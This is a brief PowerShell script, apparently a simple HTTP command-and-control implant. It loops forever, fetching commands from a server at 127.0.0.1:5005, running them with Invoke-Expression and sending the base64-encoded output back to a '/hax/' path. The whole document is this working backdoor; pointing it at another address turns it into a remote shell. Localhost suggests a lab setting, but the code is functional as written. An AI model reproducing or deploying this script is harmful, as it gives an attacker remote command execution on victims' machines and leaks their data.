while ($True){
       
    $cmd123 =  Invoke-WebRequest -Method get "http://127.0.0.1:5005/cli"
    Write-Host $cmd123
    If ($cmd123.Content  -ne "") {
        $post_cmd = Invoke-Expression $cmd123 | Out-String
        $cmd_base64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($post_cmd)) 
        $uri = "http://127.0.0.1:5005/hax/"
        $uri_encoded =  $uri +  $cmd_base64
        Invoke-WebRequest -Method get $uri_encoded
        }
    Else {
        Invoke-WebRequest -Method get http://127.0.0.1:5005/
    }
sleep 2

}
